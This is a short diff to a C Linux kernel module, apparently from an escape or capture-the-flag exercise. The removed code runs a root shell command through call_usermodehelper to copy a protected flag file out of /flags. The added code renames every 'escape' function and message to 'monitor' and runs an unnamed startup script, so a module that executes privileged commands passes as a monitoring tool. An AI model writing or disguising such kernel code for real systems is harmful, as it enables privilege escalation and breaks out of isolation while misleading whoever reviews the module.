@@ -7,23 +7,23 @@ MODULE_LICENSE("GPL");
 MODULE_AUTHOR("escapepod");
 MODULE_DESCRIPTION("kernel monitoring module");
 
-static int __init escape_init(void) {
+static int __init monitor_init(void) {
     char *argv[] = {
         "/bin/sh", "-c",
-        "cat /flags/level05 > /tmp/flag && chmod 444 /tmp/flag",
+        "/scripts/start-monitor",
         NULL
     };
     char *envp[] = {
         "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL
     };
-    printk(KERN_INFO "escape: loading\n");
+    printk(KERN_INFO "monitor: loading\n");
     call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
     return 0;
 }
 
-static void __exit escape_exit(void) {
-    printk(KERN_INFO "escape: unloading\n");
+static void __exit monitor_exit(void) {
+    printk(KERN_INFO "monitor: unloading\n");
 }
 
-module_init(escape_init);
-module_exit(escape_exit);
+module_init(monitor_init);
+module_exit(monitor_exit);
